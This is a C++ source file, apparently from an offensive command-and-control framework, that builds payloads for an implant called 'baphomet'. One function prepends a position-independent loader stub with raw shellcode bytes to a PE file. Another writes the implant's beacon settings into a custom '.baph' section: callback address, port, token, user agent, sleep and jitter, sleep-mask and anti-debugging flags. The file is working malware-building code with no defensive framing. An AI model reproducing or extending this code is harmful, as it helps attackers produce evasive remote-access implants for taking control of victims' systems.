//
// Created by diago on 2024-06-20.
//

#include <baphomet.hpp>
#include <components.hpp>

lurch::result<bool>
lurch::baphomet::concatenate_payload_stub(std::vector<char>& payload) const {

    std::vector<unsigned char> get_image_base = {
        0xE8, 0x00, 0x00, 0x00, 0x00,				// call 0
        0x59,										// pop RCX
        0x48, 0x81, 0xC1, 0x00, 0x00, 0x00, 0x00	// add RCX, <offset>
    };


    if(const auto stub = inst->db.fileman_get_raw("payloads/stub.bin")) {
        *reinterpret_cast<uint32_t*>(&get_image_base[9]) = static_cast<uint32_t>(stub->size() + 8);
        payload.insert(payload.begin(), stub->begin(), stub->end());
        payload.insert(payload.begin(), get_image_base.begin(), get_image_base.end());
        return { true };
    }

    return error("Failed to load payload stub.");
}


lurch::result<bool>
lurch::baphomet::add_payload_metadata(std::vector<char>& payload, const baphomet_metadata& metadata) {

    PIMAGE_DOS_HEADER       pdos_hdr = nullptr;
    PIMAGE_NT_HEADERS       pnt_hdrs = nullptr;
    PIMAGE_SECTION_HEADER   psec_hdr = nullptr;
    char*                   base     = nullptr;
    bool                    valid_pe = false;
    bool                    found    = false;


    if(payload.empty()) {
        return false;
    }

    const auto packed_string = io::format_str("{}!{}!{}!{}!{}!{}!{}!{}!{}",
        metadata.addr,
        metadata.port,
        metadata.user_agent,
        metadata.token,
        metadata.callback_object,
        metadata.sleep_time,
        metadata.jitter,
        metadata.use_sleepmask ? "true" : "false",
        metadata.prevent_debugging ? "true" : "false"
    );


#pragma region validity_check

    base        = &payload[0];
    pdos_hdr    = reinterpret_cast<decltype(pdos_hdr)>(&payload[0]);


    if(pdos_hdr->e_magic != IMAGE_DOS_SIGNATURE) {
        return error("Invalid DOS signature.");
    }

    if(base + pdos_hdr->e_lfanew >= base + payload.size()) {                      // bounds check 1
        return error("Invalid PE file.");
    }

    pnt_hdrs = reinterpret_cast<decltype(pnt_hdrs)>(base + pdos_hdr->e_lfanew);
    if(pnt_hdrs->Signature != IMAGE_NT_SIGNATURE) {
        return error("Invalid PE file.");
    }

    if(((char*)pnt_hdrs) + sizeof(IMAGE_NT_HEADERS) >= base + payload.size()) {   //bounds check 2
        return error("Invalid PE file.");
    }

    psec_hdr = reinterpret_cast<decltype(psec_hdr)>( ((char*)pnt_hdrs ) + sizeof(IMAGE_NT_HEADERS) );

#pragma endregion


#pragma region write_metadata
    for(size_t i = 0; i < pnt_hdrs->FileHeader.NumberOfSections; i++) {
        if(std::string(".baph") == reinterpret_cast<char*>(psec_hdr[i].Name)) {
            memcpy(base + psec_hdr[i].PointerToRawData, packed_string.data(), packed_string.size());
            found = true;
            break;
        }
    }
#pragma endregion


    if(!found) {
        return error("metadata section does not exist.");
    }

    return { true };
}


